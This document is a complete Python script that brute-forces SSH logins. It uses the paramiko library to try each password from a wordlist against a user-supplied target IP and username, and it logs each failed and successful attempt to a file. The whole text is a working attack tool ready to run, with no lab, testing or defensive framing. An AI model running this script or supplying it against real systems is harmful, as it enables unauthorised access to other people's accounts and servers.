import paramiko
import logging

logging.basicConfig(filename='ssh_brute_force.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def ssh_brute_force(ip, user, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        logging.info(f'Starting brute-force on {ip} for user {user}')
        with open(password_list, 'r') as passwords:
            for password in passwords:
                password = password.strip()
                try:
                    ssh.connect(ip, username=user, password=password)
                    logging.info(f'Success: {password}')
                    ssh.close()
                    return
                except paramiko.AuthenticationException:
                    logging.info(f'Failed: {password}')
        logging.info('Brute-force attack failed.')
    except Exception as e:
        logging.error(f'Error during brute-force attack: {e}')

if __name__ == "__main__":
    ip = input("Enter target IP: ")
    user = input("Enter username: ")
    password_list = input("Enter path to password list: ")
    ssh_brute_force(ip, user, password_list)
    print("Brute-force attack complete. Check ssh_brute_force.log for details.")
